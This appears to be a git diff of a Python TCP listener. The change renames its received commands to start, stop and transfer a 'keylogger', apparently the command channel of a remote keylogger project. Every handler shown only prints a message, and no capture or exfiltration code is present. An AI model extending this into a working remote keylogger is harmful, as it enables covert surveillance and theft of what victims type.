@@ -1,6 +1,7 @@
 from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET
+from constants import *
 
-address = ("10.65.98.206", 8000)
+address = ("10.0.0.159", 8000)
 backlog = 5
 buffsize = 1024
 
@@ -14,15 +15,19 @@ print("Connection from: ", addr)
 while True:
     msg_bytes = command_socket.recv(buffsize)
     if not msg_bytes:
+        print("Host disconected!")
+        print("quitting...")
         break
     command = msg_bytes.decode("utf-8")
-    if command == "stop":
-        print("received stop command!")
-    if command == "start":
-        print("received start command!")
-    if command == "quit":
+    if command == START_KEYLOGGER:
+        print("received start keylogger command!")
+    if command == STOP_KEYLOGGER:
+        print("received stop keylogger command!")
+    if command == TRANSFER_KEYLOGGER:
+        print("received transfer keylogger command!")
+    if command == QUIT:
         print("received quit command!")
         print("quitting...")
-        command_socket.close()
         break
+command_socket.close()
 listening_socket.close()
